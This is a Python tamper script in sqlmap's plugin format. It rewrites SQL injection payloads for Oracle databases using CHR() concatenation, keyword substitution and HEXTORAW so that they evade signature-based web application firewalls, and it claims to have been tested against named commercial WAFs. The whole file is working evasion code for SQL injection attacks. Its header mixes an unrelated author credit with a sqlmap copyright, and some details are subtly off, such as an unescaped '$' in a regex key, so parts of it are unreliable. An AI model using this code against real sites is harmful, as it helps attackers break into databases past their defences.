#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re
import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Oracle WAF bypass using string concatenation with CHR()
    
    Requirement:
        * Oracle DBMS
    
    Tested against:
        * F5 BIG-IP ASM
        * Imperva SecureSphere
        * Cloudflare (Oracle backend)
    
    Notes:
        * Converts string literals to CHR() concatenation
        * 'DUAL' becomes CHR(68)||CHR(85)||CHR(65)||CHR(76)
        * Very effective against signature-based WAFs
        * May increase payload size significantly
    
    >>> tamper("SELECT 'test' FROM DUAL")  # doctest: +ELLIPSIS
    "SELECT CHR(116)||CHR(101)||CHR(115)||CHR(116) FROM DUAL"
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    def string_to_chr(match):
        """Convert string literal to CHR() concatenation"""
        s = match.group(1)
        if not s:
            return "''"
        chr_parts = ['CHR(%d)' % ord(c) for c in s]
        return '||'.join(chr_parts)
    
    # Convert single-quoted strings to CHR() concatenation
    # Match 'string' but not empty strings or already converted
    retVal = re.sub(r"'([^']+)'", string_to_chr, retVal)
    
    return retVal


def tamper_keywords(payload, **kwargs):
    """
    Convert Oracle keywords to CHR() concatenation for dynamic SQL
    
    This is more aggressive - converts table names to concatenated strings
    for use with EXECUTE IMMEDIATE or similar
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    # Keywords to obfuscate via concatenation
    keywords = {
        'DUAL': "CHR(68)||CHR(85)||CHR(65)||CHR(76)",
        'SYS': "CHR(83)||CHR(89)||CHR(83)",
        'ALL_TABLES': "CHR(65)||CHR(76)||CHR(76)||CHR(95)||CHR(84)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(83)",
        'ALL_USERS': "CHR(65)||CHR(76)||CHR(76)||CHR(95)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83)",
        'USER$': "CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(36)",
    }
    
    for keyword, replacement in keywords.items():
        # Only replace if in a context where concatenation makes sense
        pattern = r"'%s'" % keyword
        retVal = re.sub(pattern, replacement, retVal, flags=re.IGNORECASE)
    
    return retVal


def tamper_hex(payload, **kwargs):
    """
    Oracle WAF bypass using HEXTORAW for string obfuscation
    
    Converts strings to hex representation
    'test' -> HEXTORAW('74657374')
    """
    
    if not payload:
        return payload
    
    retVal = payload
    
    def string_to_hex(match):
        """Convert string literal to HEXTORAW"""
        s = match.group(1)
        if not s:
            return "''"
        hex_str = ''.join('%02X' % ord(c) for c in s)
        return "UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('%s'))" % hex_str
    
    # Convert single-quoted strings to HEXTORAW
    retVal = re.sub(r"'([^']+)'", string_to_hex, retVal)
    
    return retVal
